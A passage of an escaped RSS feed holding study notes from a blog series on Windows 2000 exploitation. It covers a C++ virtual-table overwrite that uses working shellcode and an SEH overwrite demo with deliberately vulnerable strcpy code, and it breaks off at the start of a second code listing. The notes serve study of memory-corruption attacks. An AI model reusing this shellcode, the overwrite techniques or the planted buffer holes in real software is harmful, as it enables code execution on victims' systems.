+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xAC\xBA\x40\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// set fake virtual function pointer
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Failwest&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">virtual&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;Class Vtable::test()&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Failwest&lt;/span> &lt;span class="n">overflow&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">p_vtable&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p_vtable&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">overflow&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// point to virtual table
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;Buf Address:&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">overflow&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// reset fake virtual table to 0x0040BB5C
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// the address may need to ajusted via runtime debug
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">p_vtable&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x5C&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p_vtable&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xBB&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p_vtable&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x40&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p_vtable&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">overflow&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">shellcode&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// set fake virtual function pointer
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">overflow&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="description">Description&lt;/h3>
+&lt;ul>
+&lt;li>The dummy table pointer is located before the member variable &lt;code>char buf[200]&lt;/code>, the program locates this pointer by &lt;code>p_vtable = overflow.buf - 4&lt;/code>&lt;/li>
+&lt;li>Modify the virtual table to point to the buffer &lt;code>0x0040BB5C&lt;/code>, this is the end of the shellcode, fill in &lt;code>0x0040BAAC&lt;/code> which is the starting address of the shellcode, the program will jump to execute the shellcode&lt;/li>
+&lt;li>This way is neither stack overflow nor heap overflow, because the memory space of the object is located in the heap, but it is a continuous linear overwrite space, so it should be accurately called &amp;ldquo;array overflow&amp;rdquo; or &amp;ldquo;continuous overwrite&amp;rdquo;&lt;/li>
+&lt;li>It may be easier to attack the virtual table using DWORD SHOOT&lt;/li>
+&lt;/ul></description></item><item><title>Exploit Learning Notes 008 Windows Exception Exploitation</title><link>https://blog.moeomu.com/posts/exploit-learning-notes-008-windows-exception-exploitation/</link><pubDate>Sun, 25 Oct 2020 11:32:00 +0800</pubDate><guid>https://blog.moeomu.com/posts/exploit-learning-notes-008-windows-exception-exploitation/</guid><description>&lt;p>Disclaimer: The experimental environment is Windows 2000&lt;/p>
+&lt;p>Source: &lt;a class="link" href="https://blog.moeomu.com/posts/exploit-learning-notes-008-windows-exception-exploitation/" >Moeomu&amp;rsquo;s blog&lt;/a>&lt;/p>
+&lt;h2 id="seh-overview">SEH Overview&lt;/h2>
+&lt;ul>
+&lt;li>SEH is an exception handler structure (Structure Exception Handler), which is an important data structure used by the Windows exception handling mechanism. Each SEH contains two DWORD pointers: the SEH link table pointer and the exception handler handle, totaling 8 bytes&lt;/li>
+&lt;li>The SEH structure is stored on the stack&lt;/li>
+&lt;li>When a thread is initialized, a SEH is automatically installed on the stack as the default exception handler for the thread&lt;/li>
+&lt;li>If the program source code uses an exception handling mechanism such as &lt;code>try-except&lt;/code>, the compiler eventually implements exception handling by installing a SEH on the current function stack frame&lt;/li>
+&lt;li>There are usually multiple SEHs on the stack at the same time&lt;/li>
+&lt;li>Multiple SEHs in the stack are strung together in a single chain from the top to the bottom of the stack by means of a chain table pointer, and the SEH at the top of the chain table is identified by a pointer at the TEB0 byte offset&lt;/li>
+&lt;li>When an exception occurs, the operating system will terminate the program and first remove the SEH closest to the top of the stack from the 0 offset of the TEB to handle the exception using the code pointed to by the exception handling function handle&lt;/li>
+&lt;li>When the exception handler closest to the scene of the incident fails to run, it will try other exception handling functions in order down the SEH chain&lt;/li>
+&lt;li>If all the exception handling functions installed in the program fail to handle the exception, the system will use the default exception handling function, which will pop up an error dialog and force the program to close&lt;/li>
+&lt;/ul>
+&lt;h2 id="seh-utilization-idea">SEH utilization idea&lt;/h2>
+&lt;ul>
+&lt;li>SEH is stored in the stack, and the data in the overflow buffer can flood the SEH&lt;/li>
+&lt;li>Change SEH entry to shellcode start address&lt;/li>
+&lt;li>The wrong stack frame or heap block data will trigger an exception after the overflow&lt;/li>
+&lt;li>After Windows starts handling exceptions, shellcode is executed as an exception handling function&lt;/li>
+&lt;/ul>
+&lt;h2 id="stack-utilization-test-for-seh">Stack utilization test for SEH&lt;/h2>
+&lt;h3 id="nop-test">NOP test&lt;/h3>
+&lt;h4 id="code">Code&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// next SEH Record
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// SE Handler Function Address
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// Nothing
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// Nothing
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// EBP
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// Return Address
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">DWORD&lt;/span> &lt;span class="nf">MyExceptionhandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;got an exception, press Enter to kill process!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">getchar&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ExitProcess&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">zero&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__asm&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="c1">// used to break process for debug
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__try&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// overrun the stack
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">zero&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">zero&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// generate an exception
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__except&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MyExceptionhandler&lt;/span>&lt;span class="p">()){}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcode&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="observe">Observe&lt;/h4>
+&lt;ul>
+&lt;li>&lt;code>0x0012FE98&lt;/code> address is the starting location of the shellcode&lt;/li>
+&lt;li>There are 3 SEHs installed in the current thread, the closest to the top of the stack is at &lt;code>0x0012FF68&lt;/code>, which is the first SEH called&lt;/li>
+&lt;li>The address we want to overwrite is &lt;code>0x0012FF6C&lt;/code>, which is the address of the processing function, the content can be filled in the starting address of the ShellCode&lt;/li>
+&lt;/ul>
+&lt;h3 id="actual-test">Actual test&lt;/h3>
+&lt;h4 id="code-1">code&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
